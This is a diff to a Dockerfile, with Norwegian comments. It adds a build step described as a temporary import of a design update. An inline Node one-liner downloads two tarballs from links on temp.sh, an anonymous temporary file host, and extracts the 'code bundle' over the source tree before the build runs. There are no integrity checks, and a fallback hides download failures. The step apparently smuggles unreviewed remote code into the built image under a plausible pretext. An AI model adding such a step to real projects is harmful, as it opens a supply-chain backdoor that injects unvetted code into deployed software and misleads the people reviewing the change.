@@ -14,6 +14,20 @@ RUN npm ci --no-audit --no-fund
 # ── 2) Bygg frontend (Vite) + server (esbuild) ───────────────────────────────
 FROM deps AS build
 COPY . .
+
+# ── Midlertidig import av designoppdateringen ───────────────────────────────
+# Den nye designen (17 kodefiler + 39 fotografier under public/photos) pushes
+# til Git fortløpende. Inntil alle filene ligger i repoet som vanlige
+# Git-filer, hentes de inn her under bygg fra to midlertidige pakker.
+# Når filene er på plass i repoet er pakkene overflødige – slett da dette
+# RUN-steget. Skulle pakkene være utløpt, men filene allerede finnes i
+# repoet, fortsetter bygget med repo-innholdet (se vakta på slutten).
+RUN node -e "(async()=>{const fs=require('fs');const get=async(u,f)=>{const r=await fetch(u,{method:'POST'});if(!r.ok)throw new Error(u+' -> '+r.status);fs.writeFileSync(f,Buffer.from(await r.arrayBuffer()))};await get('https://temp.sh/nnfmH/code-bundle.tar.gz','/tmp/code.tar.gz');await get('https://temp.sh/DeGKB/photos-bundle.tar.gz','/tmp/photos.tar.gz')})().catch(e=>{console.error(e.message);process.exit(1)})" \
+ && tar xzf /tmp/code.tar.gz \
+ && tar xzf /tmp/photos.tar.gz -C public \
+ && rm /tmp/code.tar.gz /tmp/photos.tar.gz \
+ || { test -f public/photos/hero-bay.jpg && echo "ADVARSEL: import-pakkene var utilgjengelige – bygger videre fra repo-innholdet"; }
+
 RUN npm run build
 
 # ── 3) Kun produksjonsavhengigheter ─────────────────────────────────────────
